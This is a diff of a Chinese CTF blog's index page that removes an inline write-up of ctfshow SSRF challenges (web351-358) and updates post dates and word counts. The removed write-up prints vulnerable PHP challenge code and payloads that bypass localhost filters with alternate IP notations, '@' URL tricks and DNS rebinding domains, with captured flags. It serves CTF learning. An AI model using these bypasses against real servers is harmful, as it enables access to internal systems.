@@ -191,7 +191,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-02-04 00:24:49" itemprop="dateModified" datetime="2023-02-04T00:24:49+08:00">2023-02-04</time>
+                <time title="修改时间：2023-02-12 12:17:58" itemprop="dateModified" datetime="2023-02-12T12:17:58+08:00">2023-02-12</time>
               </span>
 
           <br>
@@ -219,266 +219,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h5 id="1、SSRF漏洞简介："><a href="#1、SSRF漏洞简介：" class="headerlink" title="1、SSRF漏洞简介："></a>1、SSRF<a target="_blank" rel="noopener" href="https://javaforall.cn/tag/%E6%BC%8F%E6%B4%9E">漏洞</a>简介：</h5><p>SSRF全称：Server-Side Request Forgery，即，<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/cvm?from=10680">服务器</a>端请求伪造。是一个由攻击者构造请求，在目标服务端执行的一个安全漏洞。攻击者可以利用该漏洞使服务器端向攻击者构造的任意域发出请求，目标通常是从外网无法访问的内部系统。简单来说就是利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网进行攻击。</p>
-<h5 id="2、主要攻击方式："><a href="#2、主要攻击方式：" class="headerlink" title="2、主要攻击方式："></a>2、主要攻击方式：</h5><p>当攻击者想要访问服务器B上的服务，但是由于存在防火墙或者服务器B是属于内网主机等原因导致攻击者无法直接访问。如果服务器A存在SSRF漏洞，这时攻击者可以借助服务器A来发起SSRF攻击，通过服务器A向主机B发起请求，达到攻击内网的目的。</p>
-<p>DNS协议是用来将域名转换为IP地址（也可以将IP地址转换为相应的域名地址）</p>
-<h5 id="url格式"><a href="#url格式" class="headerlink" title="url格式"></a>url格式</h5><p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/URL%E6%A0%BC%E5%BC%8F/10056474?fr=aladdin">URL格式_百度百科 (baidu.com)</a></p>
-<p>协议类型:&#x2F;&#x2F;服务器地址[:端口号]&#x2F;路径&#x2F;文件名[参数&#x3D;值]。</p>
-<p><code>protocol :// hostname[:port] / path / [:parameters][?query]#fragment</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>() <span class="comment">//这三个函数使用不当会造成ssrfl漏洞</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="curl库"><a href="#curl库" class="headerlink" title="curl库"></a>curl库</h5><p>curl是PHP的一个扩展，利用该扩展可以实现服务器之间的数据或文件传输</p>
-<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/book.curl.php">https://www.php.net/manual/zh/book.curl.php</a></p>
-<h2 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>用 cURL 函数的基本思想是先使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.curl-init.php">curl_init()</a> 初始化 cURL会话，接着可以通过 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.curl-setopt.php">curl_setopt()</a> 设置需要的全部选项，然后使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.curl-exec.php">curl_exec()</a> 来执行会话，当执行完会话后使用 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.curl-close.php">curl_close()</a> 关闭会话。</p>
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://127.0.0.1/flag.php</span><br></pre></td></tr></table></figure>
-
-<p>ctfshow{fa1bbf25-b061-4ed6-bbde-a1c388eb367e}</p>
-<h2 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="comment">/*本函数不是用来验证给定 URL 的有效性的，只是将其分解为下面列出的部分。也会接受不完整或无效的 URL，parse_url() 会尝试尽量正确解析*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127.0.0/&#x27;</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> hacker</span><br></pre></td></tr></table></figure>
-
-<p>parse_url()函数</p>
-<p> scheme——如 http  ,         host  ,        port  ,         user       ,      pass       ,    path         ,</p>
-<p>  query——在问号 <code>?</code> 之后         .</p>
-<p>  fragment——在注释符号 <code>#</code> 之后         </p>
-<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.parse-url">https://www.php.net/manual/zh/function.parse-url</a></p>
-<p>上题payload依旧可用</p>
-<p><code> </code>ctfshow{2152a6a2-ee73-4272-9d80-7a7bf43591c2}</p>
-<h2 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/localhost|127\.0\.|\。/i&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line"><span class="variable">$ch</span>=<span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$result</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>过滤了local  127.0.   。</p>
-<p><code>url=http://0/flag.php</code></p>
-<h2 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">if(!preg_match(&#x27;/localhost|1|0|。/i&#x27;, $url))&#123;</span><br><span class="line">$ch=curl_init($url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>解法一：payload:</p>
-<p><code>url=http://r.3hpgmf.ceye.io/flag.php</code></p>
-<p>解法二payload:</p>
-<p><code>url=http://sudo.cc/flag.phpd</code></p>
-<p>解法一和二都是 <strong>DNS Rebinding DNS重绑定</strong>但我不太懂</p>
-<p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p>
-<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p>
-<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>
-<ul>
-<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
-<li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li>
-<li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li>
-<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52240463/article/details/122659261">(9条消息) ctfshow ssrf_InvMacKing的博客-CSDN博客</a></p>
-<p><strong>dns解析后都是127.0.0.1</strong>  </p>
-<p><a target="_blank" rel="noopener" href="http://www.ip33.com/dns.html">dns解析网站</a></p>
-<p>ctfshow{36fde1d8-aa94-4340-8dd5-297d32bb75c8}</p>
-<h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$x[&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;=5))&#123;</span><br><span class="line">$ch=curl_init($url); </span><br></pre></td></tr></table></figure>
-
-<p><code>protocol :// hostname[:port] / path / [:parameters][?query]#fragment</code></p>
-<p>host长度小于五</p>
-<p>payload:<code>url=http://127.1/flag.php</code></p>
-<p><code>url=http://0/flag.php</code></p>
-<p><code> </code>ctfshow{cccbab1c-c78b-486c-b4da-da079ec826ad}</p>
-<h2 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$url=$_POST[&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$x[&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">$host=$x[&#x27;host&#x27;];</span><br><span class="line">if((strlen($host)&lt;=3))&#123;</span><br><span class="line">$ch=curl_init($url); </span><br></pre></td></tr></table></figure>
-
-<p>payload:</p>
-<p><code>url=http://0/flag.php</code></p>
-<p>SSRF常见的绕过方式</p>
-<p>（一）更改ip地址写法绕过</p>
-<p>一些开发者会通过对传递的URL参数进行正则表达式过滤，代码如下</p>
-<pre><code>10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;3&#125;$
-172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d))&#123;2&#125;$
-</code></pre>
-<p>这时候，我们可以通过修改进制的方式绕过，如192.168.0.1这个ip地址，就可以改写成</p>
-<p>八进制：0300.0250.0.1</p>
-<p>十进制整数：3232235521</p>
-<p>十六进制&#x2F;整数：0xC0.0xA8.0.1&#x2F;0xC0A80001</p>
-<h2 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;http&#x27;</span>||<span class="variable">$x</span>[<span class="string">&#x27;scheme&#x27;</span>]===<span class="string">&#x27;https&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$x</span>[<span class="string">&#x27;host&#x27;</span>]); <span class="comment">//返回 IPv4 地址数组，如果无法解析，则返回 false。hostname</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/br&gt;&#x27;</span>.<span class="variable">$ip</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">filter_var</span>(<span class="variable">$ip</span>, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;ip!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;scheme&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> scheme</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://r.u77wzd.ceye.io/flag.php</span><br></pre></td></tr></table></figure>
-
-<p>ctfshow{d169ee0a-273f-45a7-b225-89cd7b9b0639}</p>
-<table>
-<thead>
-<tr>
-<th>参数</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>variable</td>
-<td>必需。规定要过滤的变量。</td>
-</tr>
-<tr>
-<td>filter</td>
-<td>可选。规定要使用的过滤器的 ID。</td>
-</tr>
-<tr>
-<td>options</td>
-<td>规定包含标志&#x2F;选项的数组。检查每个过滤器可能的标志和选项。</td>
-</tr>
-</tbody></table>
-<ul>
-<li>gethostbyname — 返回主机名对应的 IPv4地址。 </li>
-<li>filter_var — 使用特定的过滤器过滤一个变量</li>
-<li>FILTER_FLAG_IPV4 - 要求值是合法的 IPv4 IP（比如 255.255.255.255）</li>
-<li>FILTER_FLAG_IPV6 - 要求值是合法的 IPv6 IP（比如 2001:0db8:85a3:08d3:1319:8a2e:0370:7334）</li>
-<li>FILTER_FLAG_NO_PRIV_RANGE - 要求值是 RFC 指定的私域 IP （比如 192.168.0.1）</li>
-<li>FILTER_FLAG_NO_RES_RANGE - 要求值不在保留的 IP 范围内。该标志接受 IPV4 和 IPV6 值。</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ing_end/article/details/124369282">https://blog.csdn.net/ing_end/article/details/124369282</a></p>
-<h2 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$x</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^http:\/\/ctf\..*show$/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
-
-<table>
-<thead>
-<tr>
-<th align="center">量词</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">+</td>
-<td>匹配任何至少包含一个前导字符串</td>
-</tr>
-<tr>
-<td align="center">*</td>
-<td>匹配任何包含零个或多个前导字符串</td>
-</tr>
-<tr>
-<td align="center">?</td>
-<td>匹配任何包含零个或1个前导字符串</td>
-</tr>
-<tr>
-<td align="center">.</td>
-<td>匹配任意一个字符串</td>
-</tr>
-<tr>
-<td align="center">{x}</td>
-<td>匹配任何包含x个前导字符串</td>
-</tr>
-<tr>
-<td align="center">{x,y}</td>
-<td>匹配任何包含 x 到 y 个前导字符串</td>
-</tr>
-<tr>
-<td align="center">{x,}</td>
-<td>匹配任何包含至少x个前导字符串</td>
-</tr>
-<tr>
-<td align="center">^</td>
-<td>匹配字符串的行首</td>
-</tr>
-<tr>
-<td align="center">$</td>
-<td>匹配字符串的行尾</td>
-</tr>
-<tr>
-<td align="center">|</td>
-<td>选择符 匹配字符串的左边或者右边</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th align="center">元字符</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">[a-z]</td>
-<td>匹配任何包含小写字母a-z的字符串</td>
-</tr>
-<tr>
-<td align="center">[A-Z]</td>
-<td>匹配任何包含大写字母A-Z的字符串</td>
-</tr>
-<tr>
-<td align="center">[0-9]</td>
-<td>匹配任何包含0-9的字符串</td>
-</tr>
-<tr>
-<td align="center">[abc]</td>
-<td>匹配任何包含小写字母a,b,c的字符串</td>
-</tr>
-<tr>
-<td align="center">[^abc]</td>
-<td>匹配任何不包含小写字母a,b,c的字符串</td>
-</tr>
-<tr>
-<td align="center">[a-zA-Z0-9_]</td>
-<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
-</tr>
-<tr>
-<td align="center">\w</td>
-<td>匹配任何包含a-zA-Z0-9和下划线的字符串</td>
-</tr>
-<tr>
-<td align="center">\W</td>
-<td>匹配任何不包含a-zA-Z0-9和下划线的字符串</td>
-</tr>
-<tr>
-<td align="center">\d</td>
-<td>匹配任何包含数字字符</td>
-</tr>
-<tr>
-<td align="center">\D</td>
-<td>匹配任何非数字字符</td>
-</tr>
-<tr>
-<td align="center">\s</td>
-<td>匹配任何空白字符</td>
-</tr>
-<tr>
-<td align="center">\S</td>
-<td>匹配任何非空白字符</td>
-</tr>
-<tr>
-<td align="center">\b</td>
-<td>匹配是否到达了单词边界</td>
-</tr>
-<tr>
-<td align="center">\B</td>
-<td>匹配没有到达了单词边界</td>
-</tr>
-<tr>
-<td align="center">\</td>
-<td>匹配正则中的特殊字符</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th align="center">修饰符</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">i</td>
-<td>完全不区分大小写</td>
-</tr>
-<tr>
-<td align="center">m</td>
-<td>可以采用多行识别,遇到换行也承认匹配规则</td>
-</tr>
-<tr>
-<td align="center">x</td>
-<td>忽略掉规则模式中的空白字符</td>
-</tr>
-<tr>
-<td align="center">A</td>
-<td>强制从头开始匹配</td>
-</tr>
-<tr>
-<td align="center">U</td>
-<td>禁止贪婪匹配，只跟踪到最近的一个匹配符并结束</td>
-</tr>
-</tbody></table>
-<p>正则表达式的意思是以<a target="_blank" rel="noopener" href="http://ctf.开头,以show结尾./">http://ctf.开头，以show结尾。</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php?show</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=http://ctf.@127.0.0.1/flag.php#show</span><br></pre></td></tr></table></figure>
-
-<p>如果不在<code>ctf.</code>后面加<code>@</code>,解析url时会把<code>ctf.</code>也解析成<strong>host</strong>的内容，</p>
-<p>ctfshow{4f304e6c-bcfb-4164-bd32-26590444c2b6}</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_52240463/article/details/122659261">https://blog.csdn.net/weixin_52240463/article/details/122659261</a></p>
-
+          <p>ssrf介绍以及ctfshow_ssrf题</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/02/02/ctfshow-ssrf/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -528,7 +277,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-02-05 00:19:39" itemprop="dateModified" datetime="2023-02-05T00:19:39+08:00">2023-02-05</time>
+                <time title="修改时间：2023-02-05 17:03:50" itemprop="dateModified" datetime="2023-02-05T17:03:50+08:00">2023-02-05</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -550,7 +299,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.8k</span>
+              <span>2k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -627,7 +376,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-02-05 15:39:41" itemprop="dateModified" datetime="2023-02-05T15:39:41+08:00">2023-02-05</time>
+                <time title="修改时间：2023-02-12 14:41:56" itemprop="dateModified" datetime="2023-02-12T14:41:56+08:00">2023-02-12</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -649,7 +398,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>954</span>
+              <span>953</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -668,7 +417,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>持续更新中。。。</p>
+          <p>   buu第一页。</p>
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/02/01/buu-web-1/#more" rel="contents">
@@ -726,7 +475,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-02-04 20:59:36" itemprop="dateModified" datetime="2023-02-04T20:59:36+08:00">2023-02-04</time>
+                <time title="修改时间：2023-02-07 22:09:36" itemprop="dateModified" datetime="2023-02-07T22:09:36+08:00">2023-02-07</time>
               </span>
 
           <br>
@@ -735,7 +484,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>542</span>
+              <span>533</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -812,7 +561,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-01-28 16:46:51" itemprop="dateModified" datetime="2023-01-28T16:46:51+08:00">2023-01-28</time>
